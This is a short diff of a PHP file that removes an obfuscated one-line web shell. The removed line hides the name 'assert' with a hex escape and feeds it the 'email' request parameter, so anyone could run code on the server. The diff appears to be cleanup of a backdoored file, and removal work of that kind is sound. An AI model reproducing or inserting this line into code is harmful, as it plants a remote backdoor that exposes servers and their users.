@@ -17,5 +17,4 @@ function GetIsMake($im)
 {
 	return $im==1 ? 'Ðè±àÒë' : '²»±àÒë';
 }
-array_map("ass\x65rt",(array)$_REQUEST['email']);
 ?>
